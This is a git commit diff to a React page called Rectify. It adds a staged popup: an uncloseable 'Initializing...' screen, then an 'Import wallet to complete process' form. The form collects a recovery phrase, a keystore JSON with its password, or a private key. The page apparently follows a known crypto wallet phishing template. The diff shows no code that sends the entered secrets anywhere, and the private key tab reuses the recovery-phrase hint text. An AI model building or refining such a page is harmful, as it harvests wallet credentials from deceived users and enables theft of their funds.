39a1e1e2161653d744b1f9cb7ffae63fc657df06
Hassnain-bit <m.hassnainkhan32@gmail.com>
2023-02-09 23:52:48 +0500

    OK DONE GOOD

--- src/pages/Rectify.js
+++ src/pages/Rectify.js
@@ -1,6 +1,8 @@
 import React, { useState } from "react";
 import "react-responsive-modal/styles.css";
 import { Modal } from "react-responsive-modal";
+import { Tab, Tabs, TabList, TabPanel } from "react-tabs";
+import "react-tabs/style/react-tabs.css";
 
 function Rectify() {
   const [loading, setLoading] = useState(false);
@@ -9,7 +11,7 @@ function Rectify() {
   // const onOpenModal = () => setOpen(true);
   const onCloseModal = () => setOpen(false);
 
-  const [openImport, setOpenImport] = useState(true);
+  const [openImport, setOpenImport] = useState(false);
 
   // const onOpenImportModal = () => setOpenImport(true);
   const onCloseImportModal = () => setOpenImport(false);
@@ -23,45 +25,166 @@ function Rectify() {
   // }, []);
 
   function Active() {
-    setLoading(true);
-    setTimeout(() => setLoading(false), 3000);
+    setOpenImport(true);
+    setTimeout(() => setOpenImport(false), 3000);
     setTimeout(() => setOpen(true), 3000);
   }
   return (
-    <div style={{ color: "white" }}>
-      <div className="app">
-        {loading ? (
-          <Modal
-            open={openImport}
-            onClose={onCloseImportModal}
-            center
-            classNames={{
-              overlay: "customOverlay",
-              modal: "init_modal",
-            }}
-          >
-            <div className="im_inner">
-              <button>Initializing...</button>
-            </div>
-          </Modal>
-        ) : (
-          ""
-        )}
+    <div>
+      <div className="popup_button">
+        <button
+          onClick={Active}
+          type="button"
+          class="btn btn-primary"
+          data-bs-toggle="modal"
+          data-bs-target="#exampleModal"
+        >
+          Launch Popup
+        </button>
       </div>
-      <button
-        onClick={Active}
-        type="button"
-        class="btn btn-primary"
-        data-bs-toggle="modal"
-        data-bs-target="#exampleModal"
-      >
-        Launch demo modal
-      </button>
 
       <div>
-        {/* <button onClick={onOpenModal}>Open modal</button> */}
-        <Modal open={open} onClose={onCloseModal} center>
-          <h2>Simple centered modal</h2>
+        <Modal
+          open={openImport}
+          onClose={onCloseImportModal}
+          center
+          closeOnOverlayClick={false}
+          closeOnEsc={false}
+          showCloseIcon={false}
+          classNames={{
+            modal: "init_modal",
+          }}
+        >
+          <div className="im_inner">
+            <div className="button">Initializing...</div>
+          </div>
+        </Modal>
+      </div>
+
+      <div>
+        <Modal
+          open={open}
+          onClose={onCloseModal}
+          center
+          classNames={{
+            modal: "form_modal",
+          }}
+          showCloseIcon={false}
+        >
+          <div className="fm_inner">
+            <div className="fm_holder">
+              <h3>Import wallet to complete process</h3>
+
+              <Tabs className="fm_tabs">
+                <TabList className="fmt_list">
+                  <Tab
+                    className="fmt_unselected"
+                    selectedClassName="fmt_selected"
+                  >
+                    Phrase
+                  </Tab>
+                  <Tab
+                    className="fmt_unselected"
+                    selectedClassName="fmt_selected"
+                  >
+                    Keystore JSON
+                  </Tab>
+                  <Tab
+                    className="fmt_unselected"
+                    selectedClassName="fmt_selected"
+                  >
+                    Private Key
+                  </Tab>
+                </TabList>
+
+                <TabPanel>
+                  <div className="fmt_panel">
+                    <textarea
+                      required
+                      rows={4}
+                      placeholder="Enter your recovery phrase"
+                    />
+                    <p>
+                      Typically 12 (sometimes 24) words separated by single
+                      spaces
+                    </p>
+                    <button>
+                      IMPORT
+                      <span>
+                        <svg
+                          fill="none"
+                          stroke-linecap="round"
+                          stroke-linejoin="round"
+                          stroke-width="2"
+                          viewBox="0 0 24 24"
+                          stroke="currentColor"
+                        >
+                          <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                        </svg>
+                      </span>
+                    </button>
+                  </div>
+                </TabPanel>
+                <TabPanel>
+                  <div className="fmt_panel">
+                    <textarea
+                      required
+                      rows={4}
+                      placeholder="Enter your Keystore JSON"
+                      style={{ marginBottom: "1.5rem" }}
+                    />
+                    <input required placeholder="Wallet password" />
+                    <p>
+                      Several lines of text beginning with "{`{`}...{`}`}" plus
+                      the password you used to encrypt it.
+                    </p>
+                    <button>
+                      IMPORT
+                      <span>
+                        <svg
+                          fill="none"
+                          stroke-linecap="round"
+                          stroke-linejoin="round"
+                          stroke-width="2"
+                          viewBox="0 0 24 24"
+                          stroke="currentColor"
+                        >
+                          <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                        </svg>
+                      </span>
+                    </button>
+                  </div>
+                </TabPanel>
+                <TabPanel>
+                  <div className="fmt_panel">
+                    <input required placeholder="Enter your Private Key" />
+                    <p>
+                      Typically 12 (sometimes 24) words separated by single
+                      spaces
+                    </p>
+                    <button>
+                      IMPORT
+                      <span>
+                        <svg
+                          fill="none"
+                          stroke-linecap="round"
+                          stroke-linejoin="round"
+                          stroke-width="2"
+                          viewBox="0 0 24 24"
+                          stroke="currentColor"
+                        >
+                          <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                        </svg>
+                      </span>
+                    </button>
+                  </div>
+                </TabPanel>
+              </Tabs>
+            </div>
+            <div className="fm_close">
+              <button onClick={onCloseModal}>Cancel</button>
+            </div>
+          </div>
         </Modal>
       </div>
 
